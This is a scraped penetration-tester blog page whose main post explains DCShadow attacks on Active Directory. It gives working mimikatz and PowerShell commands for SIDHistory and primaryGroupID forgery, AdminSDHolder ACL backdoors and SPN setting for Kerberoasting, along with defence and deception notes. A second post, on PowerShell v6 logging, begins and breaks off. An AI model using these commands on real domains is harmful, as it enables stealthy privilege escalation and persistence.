+<a href="https://3.bp.blogspot.com/-RX38b2Zd2x8/WsIP7JN8gpI/AAAAAAAAEkA/pNQEs4JNflolbNZ5zSn2QLEujRkuElsfgCLcBGAs/s1600/Invoke-Mimikatz.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="828" data-original-width="1600" height="206" src="https://3.bp.blogspot.com/-RX38b2Zd2x8/WsIP7JN8gpI/AAAAAAAAEkA/pNQEs4JNflolbNZ5zSn2QLEujRkuElsfgCLcBGAs/s400/Invoke-Mimikatz.png" width="400" /></a></div>
+<br />
+<h3>
+DCShadow for Red Teams</h3>
+<br />
+<b>Minimal permissions</b><br />
+DCShadow provides amazing persistence opportunities. Many <a href="https://adsecurity.org/?p=1929">well known ones</a> as well as some new stuff, can be executed with it without leaving logs on the DC. While learning about it, I started wondering if there is a way to use DCShadow without DA privileges? Like most domain persistence methods, we do not need DA privileges all the time for DCShadow but only for setting it up. For using it later on, only a subset of permissions are required. <br />
+<br />
+After spending much time reading MS documentations on MS-DRSR and MS-RPCE to understand the errors shown by mimikatz when not using DA and experimenting with permissions, I was able to segregate the permissions required for running DCShadow <b>without</b> having DA privileges!<br />
+<br />
+What does that mean? That means, you need DA privileges just once to set up the required minimal permissions for user of your choice. That user can successfully run DCShadow against a specific object later on. What are the rights required?<br />
+<br />
+Following (<a href="https://technet.microsoft.com/en-us/library/ff405676.aspx">extended rights</a>) for the domain object:<br />
+- DS-Install-Replica (Add/Remove Replica in Domain)<br />
+- DS-Replication-Manage-Topology (Manage Replication Topology)<br />
+- DS-Replication-Synchronize (Replication Synchornization)<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://3.bp.blogspot.com/-92rk9rbL1XA/WsSnzhCou0I/AAAAAAAAEkY/0poHrSt6TU4aL-0RCm4jOraBTXZuoPiFQCLcBGAs/s1600/Extended_Rights_modified.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="527" data-original-width="781" height="268" src="https://3.bp.blogspot.com/-92rk9rbL1XA/WsSnzhCou0I/AAAAAAAAEkY/0poHrSt6TU4aL-0RCm4jOraBTXZuoPiFQCLcBGAs/s400/Extended_Rights_modified.png" width="400" /></a></div>
+We also need WriteProperty right on the computer object of machine which is used for attack (gets registered as a DC) to modify SPNs and the target object to modify attributes.<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-IQc8WWJQ7uo/WsSpTzWCXEI/AAAAAAAAEkk/b2ug5l1mce0OkEo0tYomjpFQ-8qMGAukwCLcBGAs/s1600/Target-Permissions.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="535" data-original-width="477" height="400" src="https://2.bp.blogspot.com/-IQc8WWJQ7uo/WsSpTzWCXEI/AAAAAAAAEkk/b2ug5l1mce0OkEo0tYomjpFQ-8qMGAukwCLcBGAs/s400/Target-Permissions.png" width="356" /></a></div>
+Lastly, CreateChild and DeleteChild permissions are required on the Sites object (and child objects) in the Configuration container to register and un-register a DC. <br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-nUwxG4ThI5E/WsSpX2BUEkI/AAAAAAAAEko/mvDko0QCKQ8px64XHrrvozqcmfNE1Z_QACLcBGAs/s1600/Sites-Permission.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="462" data-original-width="414" height="400" src="https://2.bp.blogspot.com/-nUwxG4ThI5E/WsSpX2BUEkI/AAAAAAAAEko/mvDko0QCKQ8px64XHrrvozqcmfNE1Z_QACLcBGAs/s400/Sites-Permission.png" width="357" /></a></div>
+To automate modification of the objects, I give you <a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1">Set-DCShadowPermissions.ps1</a> in Nishang, a PowerShell script which sets minimal permissions for executing DCShadow attack! Use the below command with DA privileges to set permissions for user "labuser" to modify permissions on computer object ops-user19 from the computer ops-user12.&nbsp;</div>
+<div style="text-align: justify;">
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> . C:\nishang\ActiveDirectory\Set-DCShadowPermissions.ps1
+PS C:\> Set-DCShadowPermissions -FakeDC ops-user12 -Object "ops-user19" -Username labuser -Verbose
+</textarea></pre>
+</div>
+<div style="text-align: justify;">
+<div class="separator" style="clear: both; text-align: center;">
+&nbsp;<a href="https://3.bp.blogspot.com/-C-qpEuLFe_s/WsSqyAjm9YI/AAAAAAAAEk4/oygD0U36X7c9pG2rFifz5IqFIHpIl3KeQCLcBGAs/s1600/Set-DCShadowPermissions-Computer.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="259" data-original-width="1600" height="63" src="https://3.bp.blogspot.com/-C-qpEuLFe_s/WsSqyAjm9YI/AAAAAAAAEk4/oygD0U36X7c9pG2rFifz5IqFIHpIl3KeQCLcBGAs/s400/Set-DCShadowPermissions-Computer.png" width="400" /></a></div>
+</div>
+<div style="text-align: justify;">
+Now, the mimikatz command can be executed without DA privileges. Please note that the command output is same as when using DA (see the screenshots in the beginning of the post).<br />
+<div class="separator" style="clear: both; text-align: center;">
+</div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-m3pX6jdiV0Y/WsSsHrWzu2I/AAAAAAAAElY/HD5URXgZE5EPapsGACpIwKTAPq30RVkjwCLcBGAs/s1600/dcshdaow_start.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="757" data-original-width="1600" height="188" src="https://4.bp.blogspot.com/-m3pX6jdiV0Y/WsSsHrWzu2I/AAAAAAAAElY/HD5URXgZE5EPapsGACpIwKTAPq30RVkjwCLcBGAs/s400/dcshdaow_start.png" width="400" /></a></div>
+Neat isn't it! Append the -Remove parameter at the end of the above command for cleanup.<br />
+<br />
+Note that logs (4662 for changes made to ACL of the domain object, 4742 for changes made to ACL of attacker's computer object and 4738 if the target is a user object)&nbsp; are generated when you modify ACLs using Set-DCShadowPermissions but so is true for other methods required to persist with high privileges. <br />
+<br />
+Once we have the permissions (or DA), we can use DCShadow for tons of interesting things. Let's have a look at some of them. Please note that I am going to use all of them without DA by modifying permissions using Set-DCShadowPermissions:<br />
+<br />
+<h4>
+</h4>
+<b>SIDHistory</b><br />
+Very useful, also mentioned in the DCShadow presentation. Set the SIDHistory of an account to a high privilege one like DA or EA group and we are all set for highest privileges without having to modify any Group Membership or ACL.<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">PS C:\> Set-DCShadowPermissions -FakeDC ops-user12 -Object helpdeskuser -Username labuser -Verbose
+</textarea></pre>
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:helpdeskuser /attribute:SIDHistory /value:S-1-5-21-3270384115-3177237293-604223748-519
+</textarea></pre>
+&nbsp; <br />
+<b>PrimaryGroupID</b><br />
+This too is from the preso. Change the primaryGroupID of an object to a high privileged one for higher privileges.<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:helpdeskuser /attribute:primaryGroupID /value:519
+</textarea></pre>
+There is a catch though, if this is used to change primaryGroupID of a user to a privileged group, that user may show up in listing of that group which is not really stealthy. Note that this listing in the group depends on the tool used for enumeration. For example, in the below screenshot, the user "helpdeskuser" shows up as a member of "Enterprise Admins" group when using net.exe (or Get-ADGroupMember from the activedirectory module) but not when using PowerView ;)<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://3.bp.blogspot.com/-wM81WSlQW70/WsWhTL_k7FI/AAAAAAAAElo/HrUNeBVwGqMIheNcKPcWZuWNqeS2Zc0SQCLcBGAs/s1600/PrimaryGroupID.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="853" data-original-width="1600" height="212" src="https://3.bp.blogspot.com/-wM81WSlQW70/WsWhTL_k7FI/AAAAAAAAElo/HrUNeBVwGqMIheNcKPcWZuWNqeS2Zc0SQCLcBGAs/s400/PrimaryGroupID.png" width="400" /></a></div>
+<b>AdminSDHolder</b><br />
+Like the simpler attributes we modified above, it is possible to modify ACLs on objects using DCShadow by modifying the ntSecurityDescriptor attribute. This ability allows even more interesting stuff. For example, modifying <a href="https://technet.microsoft.com/en-us/library/2009.09.sdadminholder.aspx">AdminSDHolder</a> ACL for <a href="https://adsecurity.org/?p=1906">persistence</a>.<br />
+<br />
+To use this, we need to read the existing SDDL on the AdminSDHolder container and add permissions for our user's SID. Quite similar to what I used in <a href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">Set-RemoteWMI</a><br />
+<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=offensiveps,DC=com")).psbase.ObjectSecurity.sddl
+</textarea></pre>
+To add Full Control permission we can use permissions of the BA, DA or EA (highlighted in the above screenshot) and append our user's SID. The resulting below string needs to be added to the SDDL of AdminSDHolder.<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: white; color: black;">(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-3270384115-3177237293-604223748-2111)
+</textarea></pre>
+Use the below mimkatz command for DCShadow. Make sure you use the colon ":" for specifying values to parameters:<br />
+<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=offensiveps,DC=com /attribute:ntSecurityDescriptor /value:"O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;LCRPLORC;;;RU)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-3270384115-3177237293-604223748-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;RPWP;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;RPWP;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;RPWP;bf967a7f-0de6-11d0-a285-00aa003049e2;;CA)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-3270384115-3177237293-604223748-2111)"
+</textarea></pre>
+<br />
+<b>DCShadow using DCShadow - Shadowception</b><br />
+<br />
+Similar to above, we can also push DCShadow permissions using DCShadow.I call it Shadowception Why? Because it is fun :P We just need to push permissions listed above while introducing Set-DCShadowPermissions. The permissions required are:</div>
+<pre><textarea cols="70" readonly="readonly" rows="10" style="background-color: white; color: black;">On Domain object: (OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;YourUserSID)(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;YourUserSID)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;YourUserSID)
+
+On attacker computer object: (A;;WP;;;YourUserSID)
+
+On attacker user object: (A;;WP;;;YourUserSID)
+
+On the Sites object in Configuration container: (A;CI;CCDC;;;YourUserSID)
+</textarea></pre>
+<div style="text-align: justify;">
+Use the below mimikatz commands to set DCShadow permissions which can be  used only from a particular computer as a specific user against a  specific object - all of them specified in the commands. Please do not  get intimidated with long commands, I have used exactly the same method  as for AdminSDHolder - Copy the existing SDDL and append your own.</div>
+<pre><textarea cols="70" readonly="readonly" rows="5" style="background-color: black; color: white;">lsadump::dcshadow /stack /object:DC=offensiveps,DC=com /attribute:ntSecurityDescriptor /value:"Existing SDDL + Permissions for YourUserSID"
+
+lsadump::dcshadow /stack /object:ops-user12$ /attribute:ntSecurityDescriptor /value:"Existing SDDL + Permissions for YourUserSID"
+
+lsadump::dcshadow /stack /object:helpdeskuser /attribute:ntSecurityDescriptor /value:"Existing SDDL + Permissions for YourUserSID"
+
+lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=offensiveps,DC=com /attribute:ntSecurityDescriptor /value:"Existing SDDL + Permissions for YourUserSID"
+
+lsadump::dcshadow
+</textarea></pre>
+<div style="text-align: justify;">
+This is sweet! Now, if we maintain access to the computer and the user specified above, it is possible to modify the attributes of the specified object without leaving logs.<br />
+<br /></div>
+<div style="text-align: justify;">
+</div>
+</div>
+<div style="text-align: justify;">
+<b>Setting SPNs on Admin Accounts for Kerberoasting</b></div>
+<div style="text-align: justify;">
+As explained by Sean <a href="https://adsecurity.org/?p=3466">here</a>, in this technique we force set SPNs for admin accounts for later Kerberoasting. Kerberoasting, those of you who are unaware, is an attack technique where TGS (Ticket Granting Service) is requested for a SPN, saved to the disk and then brute-forced offline for password of the target SPNs service account. Thus if we can set SPN for a privileged account, it is possible to brute-force its password in clear-text using kerberoasting. To set SPNs for privileged account, we need high privileges, hence this is a persistence technique. Below command can be used to set SPN of a DA account using DCShadow:</div>
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:tempda /attribute:servicePrincipalName /value:"DCReplication/DC"
+</textarea></pre>
+<div style="text-align: justify;">
+</div>
+<div style="text-align: justify;">
+In addition to the above discussed, you can find your own attack. For example, I have not discussed setting TrustedForDelegation and TrustedToAuthForDelegation :) Go through the list of All AD attributes and find more interesting ones - <a href="https://msdn.microsoft.com/en-us/library/ms675090(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/ms675090(v=vs.85).aspx</a></div>
+<div style="text-align: justify;">
+<br />
+<b>Defense</b><br />
+For defense, see <a href="http://dcshadow.com/">dcshadow.com</a> and <a href="https://github.com/AlsidOfficial/UncoverDCShadow">UnCoverDCShadow</a>. And limit the number of DAs and usage of DA credentials across your enterprise ;) A very good reference is <a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material">Securing Privileged Access Reference Material</a>.</div>
+<div style="text-align: justify;">
+<h3>
+&nbsp;</h3>
+<h3>
+DCShadow for Blue Team Deception</h3>
+</div>
+<div style="text-align: justify;">
+For past couple of months, I have been working a lot on using Deception for defense. I am liking Active Directory Deception because of its efficacy in providing alerts and increasing (at least) time costs to an adversary. While I will leave the details for another post and/or talk, one thing difficult for me when forging objects which are interesting for an attacker is editing some of the attributes of an object. For example, it is not easy to forge a computer object to make it look like a DC object. Multiple attributes and services must be set before a computer object "appears" to be a DC. There are some workarounds but that calls for another post or as I said a talk. So, DCShadow helps with forging a domain controller which looks more real. Of course, there is a lot of scope for improvement but I really like how it open up opportunities for blue teams.<br />
+<br />
+A quick example is this. Suppose we want to make a member computer object "ops-user12" a DC. We can use the following (make sure you either have DA privs or set permission using Set-DCShadow permissions):<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:ops-user12$ /attribute:primaryGroupID /value:516</textarea></pre>
+Push the above<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /object:ops-user12$ /attribute:userAccountControl /value:532480</textarea></pre>
+Push the above<br />
+<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: black; color: white;">mimikatz # lsadump::dcshadow /manualregister</textarea></pre>
+Use the above from mimikatz instance running as DA or modified permissions. Now, if an adversary enumerates your domain, this is what it looks like:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-t_KF8spCB_s/WscHVNzh-gI/AAAAAAAAEl4/T3hx2r35lEQRe6CSH5eqZO6BZ05A-YXIgCLcBGAs/s1600/Deception_net.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="729" data-original-width="1343" height="216" src="https://2.bp.blogspot.com/-t_KF8spCB_s/WscHVNzh-gI/AAAAAAAAEl4/T3hx2r35lEQRe6CSH5eqZO6BZ05A-YXIgCLcBGAs/s400/Deception_net.png" width="400" /></a></div>
+And this holds true for most of the red team tools (like PowerView which uses the .NET class in above screenshot) and even most of the WMI classes for domain enumeration like Win32_NTDomain and ds_computer of the directory\ldap namespace.<br />
+<div class="separator" style="clear: both; text-align: center;">
+&nbsp;<a href="https://1.bp.blogspot.com/-ovc45CugxwE/WscKi8MIm7I/AAAAAAAAEmE/eIURBRQqunUV2Hbxre5zQCE6H62fzUtaQCLcBGAs/s1600/Deception_WMI.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="864" data-original-width="1355" height="255" src="https://1.bp.blogspot.com/-ovc45CugxwE/WscKi8MIm7I/AAAAAAAAEmE/eIURBRQqunUV2Hbxre5zQCE6H62fzUtaQCLcBGAs/s400/Deception_WMI.png" width="400" /></a></div>
+But this is still very experimental. We can easily note missing attributes from the fake DC, although that can be set. The thing which concerns me right now is if this breaks any authentication requests or other legit functioality. Because when using the "push" option of DCShadow, the registration and unregistration takes place quickly but when we are doing it manually what if some legit authentication requests are directed to the fake DC? I am hoping to find an answer of that soon. <br />
+<br />
+I wish this use of DCShadow for deception triggers a community effort on using AD objects for deception :)<br />
+<br />
+<b>Problems </b><br />
+Some of the problems you may face while using DCShadow:<br />
+<br />
+<b> </b> Insufficient Privileges<br />
+ERROR kuhl_m_lsadump_dcshadow_force_sync_partition ; IDL_DRSReplicaAdd<br />
+DC=whatever,DC=com 0x80090322 (2148074274)<br />
+<br />
+If you get an error like above, make sure that mimkatz is running as SYSTEM (use !processtoken). Please refer to Executing DCShadow section above.&nbsp; <br />
+<br />
+Permission Errors <br />
+If you see an error during registration like&nbsp; "Unable to add object via ldap". Then make sure that&nbsp; you are "pushing" with DA privileges from mimikatz or you have set proper permissions.&nbsp; <br />
+<br />
+In some cases, when unregistration fails (see the video!), you may have to cleanup the object created in the CN=Servers in the Configuration Container and/or SPNs of the computer object which is registered as Fake DC. To clear SPNs I am using this simple command from the activedirectorymodule.<br />
+<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">PS C:\> Set-ADComputer -ServicePrincipalNames $null -Identity ops-user12
+
+PS C:\> Set-ADComputer -ServicePrincipalNames @{Add="WSMAN/ops-user12","WSMAN/ops-user12.offensiveps.com","TERMSRV/OPS-USER12","TERMSRV/ops-user12.offensiveps.com","RestrictedKrbHost/OPS-USER12","HOST/OPS-USER12","RestrictedKrbHost/ops-user12.offensiveps.com","HOST/ops-user12.offensiveps.com"} -Identity ops-user12</textarea></pre>
+Here is a video showing the above attacks and deception.</div>
+<iframe allow="autoplay; encrypted-media" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/YLMCeAZk1Ro?rel=0" width="560"></iframe><br />
+<br />
+Hope you enjoyed the post!<br />
+<br />
+<br /></div>
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
+<span itemprop='name'>Nikhil SamratAshok Mittal</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='http://www.labofapenetrationtester.com/2018/04/dcshadow.html' itemprop='url'/>
+<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2018/04/dcshadow.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-04-06T19:22:00+05:30'>7:22 PM</abbr></a>
+</span>
+<span class='reaction-buttons'>
+</span>
+<span class='post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/04/dcshadow.html#comment-form' onclick=''>
+No comments:
+    </a>
+</span>
+<span class='post-backlinks post-comment-link'>
+<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/04/dcshadow.html#links'>Links to this post</a>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-1005506833'>
+<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=8276612405029139633&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8276612405029139633&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8276612405029139633&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8276612405029139633&target=twitter' target='_blank' title='Share to Twitter'><span class='share-button-link-text'>Share to Twitter</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8276612405029139633&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8276612405029139633&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Deception' rel='tag'>Active Directory Deception</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/BlackHat' rel='tag'>BlackHat</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/DCShadow' rel='tag'>DCShadow</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Deception' rel='tag'>Deception</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Kerberos' rel='tag'>Kerberos</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Mimikatz' rel='tag'>Mimikatz</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Nishang' rel='tag'>Nishang</a>,
+<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell%20for%20Red%20and%20Blue%20Teams' rel='tag'>Offensive PowerShell for Red and Blue Teams</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+</div>
+
+          </div></div>
+        
+
+          <div class="date-outer">
+        
+<h2 class='date-header'><span>Sunday, January 14, 2018</span></h2>
+
+          <div class="date-posts">
+        
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
+<meta content='https://1.bp.blogspot.com/-mDJTYfGKzVw/Wlr9nq6xe4I/AAAAAAAAEcc/KWVGXccPNCIl7ux5TG2i-zyHzohBhdDDwCLcBGAs/s400/transcription.png' itemprop='image_url'/>
+<meta content='8135211063584500909' itemprop='blogId'/>
+<meta content='8856735318867349918' itemprop='postId'/>
+<a name='8856735318867349918'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+<a href='https://www.labofapenetrationtester.com/2018/01/powershell6.html'>A Critique of Logging Capabilities in PowerShell v6</a>
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-8856735318867349918' itemprop='articleBody'>
+<div dir="ltr" style="text-align: left;" trbidi="on">
+<div style="text-align: justify;">
+PowerShell 6 <a href="https://blogs.msdn.microsoft.com/powershell/2018/01/10/powershell-core-6-0-generally-available-ga-and-supported/">was released</a> couple of days back. PowerShell v6 is the core version, that is, it is open source, cross platform and it is NOT Windows PowerShell which continues to be the default one on Windows. As per <a href="https://blogs.msdn.microsoft.com/powershell/2017/07/14/powershell-6-0-roadmap-coreclr-backwards-compatibility-and-more/">this blog</a> by PowerShell Team, going forward, PowerShell core is the future (Windows PowerShell will still get critical bug-fixes.)</div>
+<div style="text-align: justify;">
+PowerShell Team, over past 2-3 years, has constantly improved the security controls in PowerShell. The defining moment was, of course, <a href="https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/">PowerShell &#9829; the Blue<span style="color: black;"> </span>Team</a> where the PowerShell Team detailed many interesting features like System-wide Transcription, Deep Script Block Logging, AntiMalware Scan Interface, Protected Event Logging, Constrained Language Mode (with Applocker "Allow" mode) etc. Comparing PowerShell v2 - which comes installed by default in Windows 7 - with PowerShell 5.1 which is the default for Windows 10, the effort to restrict, track and log PowerShell usage on a box is clearly visible and effective. </div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+Having used PowerShell for 7+ years for red team assessments and  penetration tests, I look forward to every major release of PowerShell  to change and upgrade my techniques and methodologies. With PowerShell 5.1, as an attacker, I am actually afraid that whatever I do on a foothold or launchpad box may be logged and (hopefully) monitored. During my Offensive PowerShell and Active Directory training, the attendees who are industry practitioners and researchers, always appreciate the logging capabilities of PowerShell and try to implement them in their organization's networks.</div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+But with PowerShell v6, PowerShell logging features have been drastically reduced! This is almost certainly because v6 is based on .NET Core but there has been no authoritative word about it. This post is to compare the most interesting logging capabilities of PowerShell v6 with Windows PowerShell 5.1.</div>
+<div style="text-align: justify;">
+<br /></div>
+<h3 style="text-align: justify;">
+Deployment</h3>
+<div style="text-align: justify;">
+All the enhanced logging capabilities PowerShell has, can be deployed using Group Policy. But this doesn't hold true for v6! To enable whatever logging for v6, a script RegisterManifest.ps1 (found in the $PSHOME directory) needs to be executed on each machine to register PowerShellCore event provider (PowerShell remoting can be used to run this script on scale). Thanks Satoshi for <a href="https://twitter.com/standa_t/status/951468256560164864">pointing this out</a>. <br />
+<br />
+The ability to configure logging from Group Policy is much easier to manage and harder to tamper with whereas the PowerShellCore event provider can be unregistered by using the "-UnRegister" parameter of the script.</div>
+<div style="text-align: justify;">
+<br /></div>
+<h3 style="text-align: justify;">
+System-wide Transcription</h3>
+<div style="text-align: justify;">
+When System-wide transcription is enabled, all the activity for every PowerShell host (powershell.exe, powershell_ise.exe, System.Management.Automation.dll or other custom host) is logged to the specified directory or the user's "My Documents" directory if none is specified. With proper implementation, that is, forwarding logs to secure storage and correlation, system-wide transcription could be very effective in detecting PowerShell attacks.&nbsp;</div>
+<div style="text-align: justify;">
+<br /></div>
+<div style="text-align: justify;">
+This is how system-wide transcription looks like for PowerShell 5.1 (The execution is using InstallUtil)</div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-mDJTYfGKzVw/Wlr9nq6xe4I/AAAAAAAAEcc/KWVGXccPNCIl7ux5TG2i-zyHzohBhdDDwCLcBGAs/s1600/transcription.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="815" data-original-width="982" height="331" src="https://1.bp.blogspot.com/-mDJTYfGKzVw/Wlr9nq6xe4I/AAAAAAAAEcc/KWVGXccPNCIl7ux5TG2i-zyHzohBhdDDwCLcBGAs/s400/transcription.png" width="400" /></a></div>
+<div style="text-align: justify;">
+PowerShell v6 does not support system-wide transcription.</div>
+<div style="text-align: justify;">
+<br /></div>
+<h3 style="text-align: justify;">
+Script Block Logging</h3>
+<div style="text-align: justify;">
+PowerShell v5.1 has two types of script block logging: Warning level auto logging and Verbose logging that can be configured. Warning level auto logging logs known bad/suspicious commands and script blocks and logs them in Microsoft-Windows-PowerShell/Operational log as Event ID 4104 Warning. When Verbose logging is turned on, which can be done using Group Policy, PowerShell commands are logged as Event ID 4104 Verbose. </div>
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-SwCnBHZ-cOE/WltPv16kcZI/AAAAAAAAEcs/6NmVMnjPpvI7p1YoXpYb2fIpKKWiUKLrQCLcBGAs/s1600/Logging.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="392" data-original-width="1320" height="118" src="https://4.bp.blogspot.com/-SwCnBHZ-cOE/WltPv16kcZI/AAAAAAAAEcs/6NmVMnjPpvI7p1YoXpYb2fIpKKWiUKLrQCLcBGAs/s400/Logging.png" width="400" /></a></div>
+<div style="text-align: justify;">
+Yes, there are public bypasses for script block logging as blogged by Ryan Cobb <a href="https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html">here</a> and <a href="https://cobbr.io/ScriptBlock-Logging-Bypass.html">here</a>, still, it increases attacker costs.<br />
+<br />
+PowerShell v6 has no automatic script block logging. But when The PowerShellCore provider is created, the suspicious script blocks are logged with Event ID 4103 in the PowerShellCore logs.<br />
+<div class="separator" style="clear: both; text-align: center;">
